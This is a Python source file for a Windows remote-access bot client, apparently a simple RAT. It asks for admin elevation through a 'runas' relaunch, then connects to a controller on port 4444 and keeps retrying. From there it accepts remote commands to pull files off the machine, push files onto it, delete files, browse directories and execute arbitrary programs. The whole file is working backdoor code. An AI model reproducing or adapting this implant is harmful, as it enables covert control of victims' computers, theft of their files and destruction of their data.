import socket
import os
import ctypes
import sys
import time

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def getFileFromBot(filename,conn,sending_message):
    print(filename)
    if(os.path.exists(filename)):
        total=0
        filesize=os.path.getsize(filename)
        conn.send(str(filesize).encode())
        f = open(filename, 'rb')
        l = f.read(1024)
        while (total<filesize):      
            conn.send(l)
            total = total + len(l)
            l = f.read(1024)
        else:
            f.close()
            return "file uploaded"         
    else:
        return "the file does not exist"

def sendFileToBot(filename,conn):
    filesize = int(conn.recv(1024).decode())
    total = 0
    with open(filename, 'wb') as f:
        while True:
            data = conn.recv(1024)
            f.write(data)
            total = total + len(data)
            if total>=filesize: break 
    f.close()
    
def getCurrentWorkingDirectory(mySocket):
    sending_message = os.getcwd()
    mySocket.send(sending_message.encode())

def changeDirectory(mySocket,receiving_message):
    try:
        os.chdir(receiving_message[6:])
        sending_message = os.getcwd()
    except Exception as e:
        sending_message="Exception: " + str(e) 
    finally:
        mySocket.send(sending_message.encode())
        
def deleteFile(mySocket,receiving_message):
     try:
        os.remove(receiving_message[7:])
        sending_message = 'File deleted'
     except Exception as e:
        sending_message="Exception: " + str(e) 
     finally:
        mySocket.send( sending_message.encode())

def listOfFilesAndFolders(mySocket):
    sending_message = os.listdir(os.getcwd())
    mySocket.send((str(sending_message)).encode())
        
def executeFile(mySocket,receiving_message):
    try:
        os.startfile(receiving_message[8:])
        sending_message="executed: "
    except Exception as e:
        sending_message="Exception: " + str(e)      
    finally:
        mySocket.send(sending_message.encode())




def client():
    while True:
        try:
            host = "127.0.0.1"
            port = 4444
            size=1024
            mySocket = socket.socket()
            mySocket.settimeout(60) 
            mySocket.connect((host,port))
            received_message=mySocket.recv(size).decode()
            while received_message!= 'quit':
                if(received_message[0:6]=="upload"):
                    sendFileToBot(received_message[7:],mySocket)
                    mySocket.send("ok".encode())
                elif(received_message[0:8]=="download"):
                    getFileFromBot(received_message[9:],mySocket,received_message)
                    mySocket.send("ok".encode())
                elif received_message =='getcwd':
                    getCurrentWorkingDirectory(mySocket)
                elif received_message[0:5] =='chdir':
                    changeDirectory(mySocket,received_message)
                elif received_message[0:6] =='remove':
                    deleteFile(mySocket,received_message)
                elif received_message == "listdir":
                    listOfFilesAndFolders(mySocket)
                elif received_message[0:7] == 'execute':
                    executeFile(mySocket,received_message)
                else:
                    sending_message = received_message.encode()
                    mySocket.send(sending_message)
                received_message=mySocket.recv(size).decode()   
            else:
                mySocket.close()
        except:
            time.sleep(100) # sleep for 100 seconds before retrying to connect
            
if __name__ == "__main__":  
        if is_admin():
                print("admin")
                client()
        else:
                print("not admin")
                ctypes.windll.shell32.ShellExecuteW(None, "runas",sys.argv[0], "", None, 1)
        
